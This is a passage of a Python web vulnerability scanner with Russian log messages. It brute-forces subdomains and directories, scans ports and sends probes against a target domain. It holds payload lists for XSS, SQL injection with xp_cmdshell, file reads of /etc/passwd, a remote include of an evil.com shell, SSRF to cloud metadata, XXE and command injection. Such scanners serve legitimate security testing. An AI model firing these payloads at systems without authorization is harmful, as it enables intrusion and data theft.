import socket
import ssl
import requests
import subprocess
import dns.resolver
from datetime import datetime
import concurrent.futures
import json
import urllib.parse
import re
import os
import sys
import random
import string
import threading
import time
import hashlib
import base64
import urllib3
import asyncio

try:
    import nmap
except ImportError:
    nmap = None

try:
    import whois
except ImportError:
    whois = None

try:
    from colorama import init, Fore, Style

    init(autoreset=True)
except ImportError:
    
    class Fore:
        RED = ''
        GREEN = ''
        YELLOW = ''
        CYAN = ''
        RESET = ''


    Style = type('Style', (), {'RESET_ALL': ''})()

try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None

try:
    import google.generativeai as genai
except ImportError:
    genai = None

try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class UltimateSecurityAnalyzer:
    def __init__(self, domain, log_callback=None):
        self.domain = domain
        self.log_callback = log_callback
        self.results = {
            'domain': domain,
            'scan_time': datetime.now().isoformat(),
            'vulnerabilities': [],
            'critical_vulns': [],
            'ports': [],
            'services': [],
            'subdomains': [],
            'directories': [],
            'endpoints': [],
            'headers_issues': [],
            'cms_detected': None,
            'technologies': [],
            'security_score': 100,
            'ai_feedback': None
        }
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        self.xss_payloads = []
        self.sqli_payloads = []
        self.lfi_payloads = []
        self.rfi_payloads = []
        self.ssrf_payloads = []
        self.xxe_payloads = []
        self.command_injection_payloads = []
        self.load_payloads()

    async def log(self, message, level="INFO"):
        """Async logger that sends messages to callback if available"""
        if self.log_callback:
            await self.log_callback(message, level)
        else:
            # Fallback to console print
            color = Fore.RESET
            if level == "ERROR" or "[-]" in message or "[!]" in message:
                color = Fore.RED
            elif level == "WARNING" or "[*]" in message:
                color = Fore.YELLOW
            elif level == "SUCCESS" or "[+]" in message:
                color = Fore.GREEN
            elif level == "DEBUG" or "[?]" in message:
                color = Fore.CYAN
            print(f"{color}{message}{Fore.RESET}")

    def load_payloads(self):
        self.xss_payloads = [
            '<script>alert(document.domain)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '<iframe src="javascript:alert(`xss`)">',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            'javascript:alert(1)',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
        ]

        self.sqli_payloads = [
            "'",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "'; EXEC xp_cmdshell('dir')--",
            "' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES)--",
            "' OR 1=1--",
            "' AND SLEEP(5)--"
        ]

        self.lfi_payloads = [
            "../../../../etc/passwd",
            "....//....//etc/passwd",
            "../../../../windows/win.ini",
            "file:///etc/passwd",
            "/etc/passwd",
            "../../../../../../etc/passwd",
            "/proc/self/environ"
        ]

        self.rfi_payloads = [
            "http://evil.com/shell.txt",
            "https://evil.com/shell.txt",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
            "php://filter/convert.base64-encode/resource=index.php"
        ]

        self.ssrf_payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "gopher://localhost:25/_HELO%20localhost"
        ]

        self.xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
        ]

        self.command_injection_payloads = [
            ";id",
            "|id",
            "||id",
            "&id",
            "&&id",
            "`id`",
            "$(id)",
            ";cat /etc/passwd",
            ";whoami",
            ";uname -a"
        ]

    async def print_banner(self, title):
        await self.log(f"\n{'=' * 80}", "DEBUG")
        await self.log(f"{title}", "WARNING")
        await self.log(f"{'=' * 80}", "DEBUG")

    async def generate_ai_feedback(self):
        await self.print_banner("AI ANALYSIS (GEMINI)")
        
        if not genai:
            await self.log("Google Generative AI library not installed.", "WARNING")
            self.results['ai_feedback'] = "Google Generative AI library not installed."
            return

        api_key = os.getenv("GEMINI_API_KEY")
        if not api_key:
            # Fallback to look for OPENAI_API_KEY if user hasn't updated env yet
            # But really we want GEMINI_API_KEY. We can be flexible.
            api_key = os.getenv("OPENAI_API_KEY") # Try to use existing key slot if user pasted gemini key there
            
        if not api_key:
            await self.log("GEMINI_API_KEY not found in environment variables.", "WARNING")
            self.results['ai_feedback'] = "Please set GEMINI_API_KEY environment variable to enable AI analysis."
            return

        try:
            genai.configure(api_key=api_key)
            
            # Prepare summary for AI
            summary = {
                "domain": self.domain,
                "score": self.results['security_score'],
                "critical_vulns": len(self.results['critical_vulns']),
                "vulns": len(self.results['vulnerabilities']),
                "open_ports": len(self.results['ports']),
                "details": {
                    "critical": self.results['critical_vulns'],
                    "warnings": self.results['vulnerabilities'][:5] # Limit to top 5 to save tokens
                }
            }
            
            prompt = f"""
            Analyze the following security scan results for {self.domain}:
            {json.dumps(summary, indent=2)}
            
            Provide a concise security assessment, highlight the most critical risks, and suggest 3 key remediation steps.
            Respond in Russian language.
            IMPORTANT: Do not use any markdown formatting like asterisks (**), hashes (#), or bullet points with symbols. 
            Use only plain text with clear headings and spacing.
            """
            
            await self.log("Requesting AI analysis from Gemini...", "INFO")
            
            model = genai.GenerativeModel('gemini-2.5-flash')
            response = await asyncio.to_thread(model.generate_content, prompt)
            
            feedback = response.text
            
            # Clean up any remaining markdown symbols just in case
            feedback = feedback.replace("**", "").replace("###", "").replace("##", "").replace("#", "").replace("* ", "• ")
            
            self.results['ai_feedback'] = feedback.strip()
            await self.log("AI Analysis complete.", "SUCCESS")
            
        except Exception as e:
            await self.log(f"AI Analysis failed: {str(e)}", "ERROR")
            self.results['ai_feedback'] = f"AI Analysis failed: {str(e)}"

    async def check_dns(self):
        await self.print_banner("АНАЛИЗ DNS")
        try:
            resolver = dns.resolver.Resolver()
            resolver.nameservers = ['8.8.8.8', '1.1.1.1']

            records = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']
            for record_type in records:
                try:
                    answers = resolver.resolve(self.domain, record_type)
                    await self.log(f"[+] {record_type}:", "SUCCESS")
                    for rdata in answers:
                        await self.log(f"    {rdata}", "INFO")
                except:
                    pass

            await self.bruteforce_subdomains()

        except Exception as e:
            await self.log(f"[-] DNS error: {e}", "ERROR")

    async def bruteforce_subdomains(self):
        await self.log(f"\n[*] Перебор поддоменов...", "WARNING")
        wordlist = [
            'www', 'mail', 'ftp', 'admin', 'test', 'dev', 'staging', 'api',
            'secure', 'blog', 'shop', 'portal', 'webmail', 'ns1', 'ns2',
            'vpn', 'git', 'jenkins', 'docker', 'monitor', 'app', 'mobile',
            'beta', 'backup', 'temp', 'test1', 'stage', 'web', 'login',
            'dashboard', 'panel', 'server', 'support', 'help', 'forum',
            'chat', 'news', 'video', 'music', 'radio', 'shop', 'store',
            'payment', 'account', 'user', 'profile', 'search', 'sitemap',
            'robots', 'git', 'svn', 'cgi-bin', 'admin', 'administrator'
        ]

        found_subs = []

        # Async wrapper for sync network call
        def check_sub_sync(sub):
            try:
                ip = socket.gethostbyname(f"{sub}.{self.domain}")
                return (sub, ip)
            except:
                return None

        # Using asyncio.to_thread for blocking calls
        tasks = []
        for sub in wordlist:
            tasks.append(asyncio.to_thread(check_sub_sync, sub))
        
        results = await asyncio.gather(*tasks)
        
        for res in results:
            if res:
                sub, ip = res
                await self.log(f"[+] {sub}.{self.domain} -> {ip}", "SUCCESS")
                found_subs.append(f"{sub}.{self.domain}")

        if found_subs:
            self.results['subdomains'] = found_subs
            await self.log(f"[+] Найдено {len(found_subs)} поддоменов", "SUCCESS")
        else:
            await self.log(f"[-] Поддомены не найдены", "ERROR")

    async def check_http_https(self):
        await self.print_banner("АНАЛИЗ HTTP/HTTPS")

        targets = [
            f"http://{self.domain}",
            f"https://{self.domain}",
            f"http://www.{self.domain}",
            f"https://www.{self.domain}"
        ]

        for url in targets:
            try:
                # Run sync requests in thread
                response = await asyncio.to_thread(self.session.get, url, timeout=10, verify=False)
                await self.log(f"[+] {url} - {response.status_code}", "SUCCESS")

                if response.history:
                    for resp in response.history:
                        await self.log(f"[→] Redirect: {resp.status_code} -> {resp.url}", "WARNING")

                await self.analyze_response(url, response)

            except requests.exceptions.SSLError as e:
                await self.log(f"[-] {url} - SSL Error: {e}", "ERROR")
                self.results['vulnerabilities'].append(f"SSL Error: {e}")
                self.results['security_score'] -= 20
            except Exception as e:
                await self.log(f"[-] {url} - Unavailable: {e}", "ERROR")

    async def analyze_response(self, url, response):
        await self.check_headers_security(response.headers)
        await self.check_cms(response.text, response.headers)
        await self.check_technologies(response.headers, response.text)
        await self.extract_endpoints(response.text, url)

        if response.status_code == 200:
            await self.advanced_xss_scan(url, response.text)
            await self.advanced_sqli_scan(url, response.text)
            await self.advanced_lfi_scan(url)
            await self.advanced_ssrf_scan(url)
            await self.command_injection_scan(url)
            await self.check_crlf_injection(url)
            await self.check_open_redirect(url)

    async def check_headers_security(self, headers):
        await self.log(f"\n[*] Проверка заголовков безопасности:", "WARNING")

        security_checks = {
            'Strict-Transport-Security': {
                'check': lambda h: 'Strict-Transport-Security' in h,
                'message': 'HSTS не настроен',
                'penalty': 15
            },
            'Content-Security-Policy': {
                'check': lambda h: 'Content-Security-Policy' in h,
                'message': 'CSP не настроен',
                'penalty': 10
            },
            'X-Frame-Options': {
                'check': lambda h: 'X-Frame-Options' in h,
                'message': 'Отсутствует защита от кликджекинга',
                'penalty': 10
            },
            'X-Content-Type-Options': {
                'check': lambda h: 'X-Content-Type-Options' in h,
                'message': 'MIME-sniffing не заблокирован',
                'penalty': 5
            },
            'X-XSS-Protection': {
                'check': lambda h: 'X-XSS-Protection' in h and '1; mode=block' in h['X-XSS-Protection'],
                'message': 'Защита от XSS слабая или отсутствует',
                'penalty': 10
            },
            'Referrer-Policy': {
                'check': lambda h: 'Referrer-Policy' in h and h['Referrer-Policy'] in ['no-referrer', 'strict-origin',
                                                                                       'strict-origin-when-cross-origin'],
                'message': 'Политика Referrer слабая или отсутствует',
                'penalty': 5
            }
        }

        for header, check_info in security_checks.items():
            if check_info['check'](headers):
                await self.log(f"    [+] {header}: OK", "SUCCESS")
            else:
                await self.log(f"    [-] {check_info['message']}", "ERROR")
                self.results['headers_issues'].append(check_info['message'])
                self.results['security_score'] -= check_info['penalty']

    async def check_cms(self, content, headers):
        cms_indicators = {
            'WordPress': ['wp-content', 'wp-includes', 'wordpress', '/wp-admin/', 'xmlrpc.php'],
            'Joomla': ['joomla', '/media/system/', '/administrator/', 'index.php?option='],
            'Drupal': ['drupal', '/sites/all/', '/modules/', '?q=user/password'],
            'Magento': ['magento', '/skin/frontend/', '/media/'],
            'Shopify': ['shopify', 'cdn.shopify.com']
        }

        for cms, indicators in cms_indicators.items():
            for indicator in indicators:
                if indicator.lower() in content.lower() or (
                        headers.get('Server') and indicator.lower() in headers['Server'].lower()) or (
                        headers.get('X-Powered-By') and indicator.lower() in headers['X-Powered-By'].lower()):
                    await self.log(f"[*] Detected CMS/Technology: {cms}", "WARNING")
                    self.results['cms_detected'] = cms
                    self.results['technologies'].append(cms)

                    if cms in ['WordPress', 'Joomla', 'Drupal']:
                        await self.check_cms_vulnerabilities(cms)
                    return

    async def check_technologies(self, headers, content):
        tech_patterns = {
            'JavaScript Frameworks': ['react', 'angular', 'vue', 'jquery'],
            'CSS Frameworks': ['bootstrap', 'foundation'],
            'Web Servers': ['nginx', 'apache', 'iis'],
            'Programming Languages': ['php', 'python', 'ruby', 'java', 'asp'],
            'Databases': ['mysql', 'postgresql', 'mongodb', 'redis']
        }

        detected = []
        for tech, patterns in tech_patterns.items():
            for pattern in patterns:
                if pattern in content.lower() or (
                        headers.get('X-Powered-By') and pattern in headers['X-Powered-By'].lower()):
                    detected.append(pattern)

        if detected:
            await self.log(f"[*] Technologies: {', '.join(set(detected))}", "WARNING")
            self.results['technologies'].extend(list(set(detected)))

    async def extract_endpoints(self, content, base_url):
        endpoints = set()

        patterns = [
            r'href=["\']([^"\']+)["\']',
            r'src=["\']([^"\']+)["\']',
            r'action=["\']([^"\']+)["\']'
        ]

        for pattern in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple):
                    match = match[0]
                if match and not match.startswith(('http://', 'https://', '//', 'mailto:', 'tel:', '#')):
                    if match.startswith('/'):
                        endpoints.add(f"{base_url.rstrip('/')}{match}")
                    else:
                        endpoints.add(f"{base_url.rstrip('/')}/{match}")

        if endpoints:
            await self.log(f"[*] Found {len(endpoints)} endpoints", "WARNING")
            self.results['endpoints'] = list(endpoints)
            for endpoint in list(endpoints)[:5]:
                await self.log(f"    {endpoint}", "INFO")

    async def check_cms_vulnerabilities(self, cms):
        await self.log(f"[*] Checking {cms} vulnerabilities...", "WARNING")

        if cms == 'WordPress':
            wp_urls = [
                f"http://{self.domain}/wp-admin/",
                f"http://{self.domain}/wp-login.php",
                f"http://{self.domain}/xmlrpc.php",
                f"http://{self.domain}/readme.html"
            ]

            for url in wp_urls:
                try:
                    response = await asyncio.to_thread(self.session.get, url, timeout=5, verify=False)
                    if response.status_code == 200:
                        await self.log(f"[-] {url} доступен", "ERROR")
                        self.results['vulnerabilities'].append(f"WordPress {url.split('/')[-1]} accessible")
                        self.results['security_score'] -= 10
                except:
                    pass

    async def advanced_xss_scan(self, url, content):
        await self.log(f"[*] Advanced XSS Scanning...", "WARNING")

        vulnerable = False

        if '?' in url:
            params = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
            for param_name, param_values in params.items():
                for payload in self.xss_payloads[:3]:
                    test_url = url.replace(param_values[0], payload)
                    try:
                        response = await asyncio.to_thread(self.session.get, test_url, timeout=5, verify=False)
                        if payload in response.text:
                            await self.log(f"[!] XSS possible in parameter: {param_name}", "ERROR")
                            vulnerable = True
                            self.results['critical_vulns'].append(f"XSS in {param_name}")
                            self.results['security_score'] -= 25
                    except:
                        pass

        if not vulnerable:
            await self.log(f"[+] No obvious XSS vulnerabilities found", "SUCCESS")

    async def advanced_sqli_scan(self, url, content):
        await self.log(f"[*] Advanced SQL Injection Scanning...", "WARNING")

        vulnerable = False
        error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"PostgreSQL.*ERROR",
            r"ORA-\d{5}",
            r"Microsoft SQL Server",
            r"Unclosed quotation mark"
        ]

        if '?' in url:
            params = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
            for param_name, param_values in params.items():
                for payload in self.sqli_payloads[:3]:
                    test_url = url.replace(param_values[0], payload)
                    try:
                        response = await asyncio.to_thread(self.session.get, test_url, timeout=10, verify=False)
                        content_lower = response.text.lower()

                        for pattern in error_patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                await self.log(f"[!] Возможна SQL инъекция в параметре: {param_name}", "ERROR")
                                vulnerable = True
                                self.results['critical_vulns'].append(f"SQLi in {param_name}")
                                self.results['security_score'] -= 30
                                break
                    except:
                        pass

        if not vulnerable:
            await self.log(f"[+] Явных уязвимостей SQL Injection не найдено", "SUCCESS")

    async def advanced_lfi_scan(self, url):
        await self.log(f"[*] Advanced LFI/RFI Scanning...", "WARNING")

        vulnerable = False

        for payload in self.lfi_payloads[:3]:
            test_url = f"{url}?file={payload}"
            try:
                response = await asyncio.to_thread(self.session.get, test_url, timeout=5, verify=False)
                if 'root:' in response.text or '[fonts]' in response.text:
                    await self.log(f"[!] Возможен LFI: {payload}", "ERROR")
                    vulnerable = True
                    self.results['critical_vulns'].append("Local File Inclusion")
                    self.results['security_score'] -= 25
            except:
                pass

        if not vulnerable:
            await self.log(f"[+] No obvious LFI/RFI vulnerabilities found", "SUCCESS")

    async def advanced_ssrf_scan(self, url):
        await self.log(f"[*] Расширенное сканирование SSRF...", "WARNING")

        vulnerable = False

        for payload in self.ssrf_payloads[:3]:
            test_url = f"{url}?url={payload}"
            try:
                response = await asyncio.to_thread(self.session.get, test_url, timeout=3, verify=False)
                if 'root:' in response.text or 'aws' in response.text.lower():
                    await self.log(f"[!] Возможен SSRF: {payload}", "ERROR")
                    vulnerable = True
                    self.results['critical_vulns'].append("Server-Side Request Forgery")
                    self.results['security_score'] -= 20
            except:
                pass

        if not vulnerable:
            await self.log(f"[+] No obvious SSRF vulnerabilities found", "SUCCESS")

    async def command_injection_scan(self, url):
        await self.log(f"[*] Сканирование на инъекции команд...", "WARNING")

        vulnerable = False

        if '?' in url:
            params = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
            for param_name, param_values in params.items():
                for payload in self.command_injection_payloads[:3]:
                    test_url = url.replace(param_values[0], payload)
                    try:
                        time_before = time.time()
                        response = await asyncio.to_thread(self.session.get, test_url, timeout=10, verify=False)

                        if time.time() - time_before > 4:
                            await self.log(f"[!] Time-based command injection possible in: {param_name}", "ERROR")
                            vulnerable = True
                            self.results['critical_vulns'].append(f"Command injection in {param_name}")
                            self.results['security_score'] -= 25

                        if 'uid=' in response.text or 'gid=' in response.text:
                            await self.log(f"[!] Возможна инъекция команд в: {param_name}", "ERROR")
                            vulnerable = True
                            self.results['critical_vulns'].append(f"Command injection in {param_name}")
                            self.results['security_score'] -= 25

                    except Exception as e:
                        pass

        if not vulnerable:
            await self.log(f"[+] Явных уязвимостей инъекции команд не найдено", "SUCCESS")

    async def check_crlf_injection(self, url):
        await self.log(f"[*] Сканирование CRLF инъекций...", "WARNING")

        crlf_payloads = [
            '%0d%0aSet-Cookie:injected=true',
            '%0d%0aX-Injected:true'
        ]

        for payload in crlf_payloads:
            test_url = f"{url}?param={payload}"
            try:
                response = await asyncio.to_thread(self.session.get, test_url, timeout=5, verify=False, allow_redirects=False)
                headers = str(response.headers).lower()
                if 'injected' in headers:
                    await self.log(f"[!] Возможна CRLF инъекция", "ERROR")
                    self.results['vulnerabilities'].append("CRLF Injection")
                    self.results['security_score'] -= 15
                    return
            except:
                pass

        await self.log(f"[+] Явных уязвимостей CRLF инъекции не найдено", "SUCCESS")

    async def check_open_redirect(self, url):
        await self.log(f"[*] Сканирование открытых редиректов...", "WARNING")

        redirect_payloads = [
            'https://evil.com',
            '//evil.com'
        ]

        for payload in redirect_payloads:
            test_url = f"{url}?redirect={payload}"
            try:
                response = await asyncio.to_thread(self.session.get, test_url, timeout=5, verify=False, allow_redirects=True)
                if 'evil.com' in response.url:
                    await self.log(f"[!] Open Redirect possible", "ERROR")
                    self.results['vulnerabilities'].append("Open Redirect")
                    self.results['security_score'] -= 10
                    return
            except:
                pass

        await self.log(f"[+] Явных уязвимостей открытого редиректа не найдено", "SUCCESS")

    async def check_ssl_certificate(self):
        await self.print_banner("АНАЛИЗ SSL/TLS")

        try:
            context = ssl.create_default_context()
            # Async socket connection using asyncio
            try:
                # Resolve domain first
                reader, writer = await asyncio.open_connection(self.domain, 443, ssl=context)
                
                # Get cert from SSL object
                ssl_obj = writer.get_extra_info('ssl_object')
                cert = ssl_obj.getpeercert()

                await self.log(f"[+] Сертификат найден", "SUCCESS")

                not_after = cert['notAfter']
                not_before = cert['notBefore']
                expiry_date = datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                days_left = (expiry_date - datetime.now()).days

                await self.log(f"[+] Действителен с: {not_before}", "SUCCESS")
                await self.log(f"[+] Действителен до: {not_after}", "SUCCESS")
                await self.log(f"[+] Дней осталось: {days_left}", "SUCCESS")

                if days_left < 30:
                    await self.log(f"[!] ПРЕДУПРЕЖДЕНИЕ: Сертификат скоро истекает!", "WARNING")
                    self.results['vulnerabilities'].append("SSL certificate expires soon")
                    self.results['security_score'] -= 20

                if days_left < 0:
                    await self.log(f"[!] КРИТИЧЕСКИ: Сертификат истек!", "ERROR")
                    self.results['critical_vulns'].append("SSL certificate expired")
                    self.results['security_score'] -= 40

                cipher = ssl_obj.cipher()
                await self.log(f"[+] Шифр: {cipher[0]} {cipher[1]} {cipher[2]}", "INFO")

                if 'RC4' in cipher[0] or 'DES' in cipher[0] or '3DES' in cipher[0]:
                    await self.log(f"[!] Обнаружен слабый шифр: {cipher[0]}", "ERROR")
                    self.results['vulnerabilities'].append(f"Weak cipher: {cipher[0]}")
                    self.results['security_score'] -= 15

                tls_version = ssl_obj.version()
                await self.log(f"[+] TLS Version: {tls_version}", "INFO")

                if tls_version in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.0']:
                    await self.log(f"[!] Weak TLS version: {tls_version}", "ERROR")
                    self.results['vulnerabilities'].append(f"Weak TLS version: {tls_version}")
                    self.results['security_score'] -= 20
                
                writer.close()
                await writer.wait_closed()

            except Exception as e:
                # Fallback to sync socket if asyncio fails or timeout
                 await self.log(f"[-] Ошибка асинхронной SSL проверки, пробуем синхронно...", "WARNING")
                 raise e

        except Exception as e:
            await self.log(f"[-] Ошибка SSL: {e}", "ERROR")
            self.results['vulnerabilities'].append(f"SSL check failed: {e}")
            self.results['security_score'] -= 30

    async def full_port_scan(self):
        await self.print_banner("ПОЛНОЕ СКАНИРОВАНИЕ ПОРТОВ")

        if nmap is None:
            await self.log(f"[-] python-nmap не установлен. Пропуск сканирования портов.", "ERROR")
            await self.log(f"[*] Установите с помощью: pip install python-nmap", "WARNING")
            await self.quick_port_scan()
            return

        try:
            nm = nmap.PortScanner()

            await self.log(f"[*] Запуск сканирования портов...", "WARNING")

            # Run nmap scan in thread pool
            await asyncio.to_thread(nm.scan, self.domain, arguments='-p 1-1000 -T4 -sV')

            if self.domain in nm.all_hosts():
                host = nm[self.domain]

                await self.log(f"[+] Статус хоста: {host.state()}", "SUCCESS")

                protocols = ['tcp', 'udp']
                for proto in protocols:
                    if proto in host:
                        await self.log(f"\n[*] {proto.upper()} ПОРТЫ:", "INFO")
                        for port in sorted(host[proto].keys()):
                            port_info = host[proto][port]
                            state = port_info['state']

                            if state == 'open':
                                status = f"[+] Порт {port}: {port_info['name']} - ОТКРЫТ"
                                await self.log(status, "SUCCESS")

                                service_info = f"Сервис: {port_info.get('product', '')} {port_info.get('version', '')}"
                                if service_info.strip():
                                    await self.log(f"    {service_info}", "INFO")

                                self.results['ports'].append({
                                    'port': port,
                                    'protocol': proto,
                                    'state': state,
                                    'service': port_info['name'],
                                    'product': port_info.get('product', ''),
                                    'version': port_info.get('version', '')
                                })

                                self.results['services'].append({
                                    'port': port,
                                    'name': port_info['name'],
                                    'product': port_info.get('product', '')
                                })

            else:
                await self.log(f"[-] Хост не найден или недоступен", "ERROR")

        except Exception as e:
            await self.log(f"[-] Ошибка сканирования портов: {e}", "ERROR")
            await self.quick_port_scan()

    async def quick_port_scan(self):
        await self.log(f"[*] Быстрое сканирование портов...", "WARNING")

        top_ports = [
            21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445,
            993, 995, 1723, 3306, 3389, 5900, 8080, 8443, 8888, 9000,
            27017, 5000, 5432, 6379, 9200, 11211
        ]

        open_ports = []

        def scan_port_sync(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.domain, port))
                sock.close()
                
                if result == 0:
                    try:
                        service = socket.getservbyport(port)
                    except:
                        service = 'unknown'
                    return (port, service, True)
                else:
                    return (port, None, False)
            except:
                return (port, None, None)

        tasks = []
        for port in top_ports:
            tasks.append(asyncio.to_thread(scan_port_sync, port))
            
        results = await asyncio.gather(*tasks)
        
        for port, service, is_open in results:
            if is_open:
                await self.log(f"[+] Порт {port} ({service}) - ОТКРЫТ", "SUCCESS")
                open_ports.append((port, service))

                self.results['ports'].append({
                    'port': port,
                    'protocol': 'tcp',
                    'state': 'open',
                    'service': service
                })
            elif is_open is False:
                await self.log(f"[-] Порт {port} - ЗАКРЫТ", "ERROR")
            else:
                await self.log(f"[-] Порт {port} - ОШИБКА", "ERROR")

        return open_ports

    async def check_whois(self):
        await self.print_banner("ИНФОРМАЦИЯ WHOIS")

        if whois is None:
            await self.log(f"[-] python-whois не установлен. Пропуск WHOIS.", "ERROR")
            await self.log(f"[*] Установите с помощью: pip install python-whois", "WARNING")
            return

        try:
            # Run whois in thread
            w = await asyncio.to_thread(whois.whois, self.domain)

            if w.domain_name:
                await self.log(f"[+] Домен: {w.domain_name}", "SUCCESS")

            if w.registrar:
                await self.log(f"[+] Регистратор: {w.registrar}", "SUCCESS")

            if w.creation_date:
                await self.log(f"[+] Создан: {w.creation_date}", "SUCCESS")

            if w.expiration_date:
                expiry_date = w.expiration_date
                if isinstance(expiry_date, list):
                    expiry_date = expiry_date[0]

                await self.log(f"[+] Истекает: {expiry_date}", "SUCCESS")

                if isinstance(expiry_date, datetime):
                    days_left = (expiry_date - datetime.now()).days
                    await self.log(f"[+] Дней до истечения: {days_left}", "SUCCESS")

                    if days_left < 30:
                        await self.log(f"[!] Домен скоро истекает!", "ERROR")
                        self.results['vulnerabilities'].append("Domain expires soon")
                        self.results['security_score'] -= 10

            if w.name_servers:
                await self.log(f"[+] Name-серверы:", "SUCCESS")
                for ns in w.name_servers[:3]:
                    await self.log(f"    {ns}", "INFO")

        except Exception as e:
            await self.log(f"[-] Ошибка WHOIS: {e}", "ERROR")

    async def directory_bruteforce(self):
        await self.print_banner("ПЕРЕБОР ДИРЕКТОРИЙ")

        common_dirs = [
            'admin', 'administrator', 'login', 'wp-admin', 'wp-login',
            'dashboard', 'control', 'manager', 'private', 'secret',
            'backup', 'backups', 'old', 'new', 'temp', 'tmp', 'test',
            'api', 'api/v1', 'rest', 'graphql', 'cgi-bin',
            'includes', 'assets', 'static', 'uploads', 'downloads',
            'images', 'css', 'js', 'vendor', 'lib', 'modules',
            'plugins', 'themes', 'cache', 'session', 'oauth',
            'auth', 'register', 'signup', 'signin', 'logout',
            'password', 'reset', 'account', 'user', 'profile',
            'shop', 'store', 'cart', 'checkout', 'payment',
            'contact', 'about', 'team', 'blog', 'news', 'forum',
            'support', 'help', 'faq', 'wiki', 'docs', 'download',
            'search', 'sitemap', 'robots.txt', 'security.txt',
            '.env', '.git', '.svn', '.htaccess', '.htpasswd',
            'config.php', 'settings.php', 'web.config',
            'backup.zip', 'backup.sql', 'database.sql',
            'README.md', 'LICENSE', 'CHANGELOG'
        ]

        found_dirs = []

        def check_dir_sync(directory):
            url = f"http://{self.domain}/{directory}"
            try:
                response = self.session.get(url, timeout=3, verify=False, allow_redirects=False)
                if response.status_code == 200:
                    return (url, "FOUND", 200)
                elif response.status_code == 403:
                    return (url, "FORBIDDEN", 403)
                elif response.status_code in [301, 302]:
                    return (url, "REDIRECT", response.status_code)
                return None
            except:
                return None

        tasks = []
        for directory in common_dirs:
            tasks.append(asyncio.to_thread(check_dir_sync, directory))

        results = await asyncio.gather(*tasks)

        for res in results:
            if res:
                url, status, code = res
                if status == "FOUND":
                    await self.log(f"[+] {url} - НАЙДЕНО ({code})", "SUCCESS")
                    found_dirs.append(url)
                elif status == "FORBIDDEN":
                    await self.log(f"[!] {url} - ЗАПРЕЩЕНО ({code})", "WARNING")
                elif status == "REDIRECT":
                    await self.log(f"[→] {url} - РЕДИРЕКТ ({code})", "INFO")

        if found_dirs:
            self.results['directories'] = found_dirs
            await self.log(f"[+] Найдено {len(found_dirs)} директорий", "SUCCESS")
        else:
            await self.log(f"[-] Директории не найдены", "ERROR")

    async def check_vulnerabilities(self):
        await self.print_banner("СКАНИРОВАНИЕ УЯЗВИМОСТЕЙ")

        await self.log(f"[*] Проверка на распространенные уязвимости...", "WARNING")

        await self.check_http_methods()
        await self.check_server_status()
        await self.check_config_files()
        await self.check_backup_files()
        await self.check_source_code_leakage()
        await self.check_cors_misconfiguration()

    async def check_http_methods(self):
        await self.log(f"[*] Проверка HTTP методов...", "WARNING")

        methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE']
        dangerous_methods = ['PUT', 'DELETE', 'TRACE']

        for method in methods:
            try:
                response = await asyncio.to_thread(self.session.request, method, f"http://{self.domain}", timeout=5, verify=False)
                await self.log(f"[?] {method}: {response.status_code}", "INFO")

                if method in dangerous_methods and response.status_code in [200, 201, 204]:
                    await self.log(f"[!] Опасный метод {method} разрешен", "ERROR")
                    self.results['vulnerabilities'].append(f"Dangerous HTTP method {method} allowed")
                    self.results['security_score'] -= 10

                if method == 'TRACE' and response.status_code == 200:
                    await self.log(f"[!] Метод TRACE включен - возможен XST", "ERROR")
                    self.results['critical_vulns'].append("TRACE method enabled (XST)")
                    self.results['security_score'] -= 15

            except:
                await self.log(f"[-] {method}: Ошибка", "ERROR")

    async def check_server_status(self):
        await self.log(f"[*] Проверка страниц статуса сервера...", "WARNING")

        status_urls = [
            f"http://{self.domain}/server-status",
            f"http://{self.domain}/status",
            f"http://{self.domain}/php-status"
        ]

        for url in status_urls:
            try:
                response = await asyncio.to_thread(self.session.get, url, timeout=3, verify=False)
                if response.status_code == 200 and (
                        'server-status' in response.text.lower() or 'apache' in response.text.lower()):
                    await self.log(f"[!] Страница статуса сервера доступна: {url}", "ERROR")
                    self.results['vulnerabilities'].append("Server status page exposed")
                    self.results['security_score'] -= 10
            except:
                pass

    async def check_config_files(self):
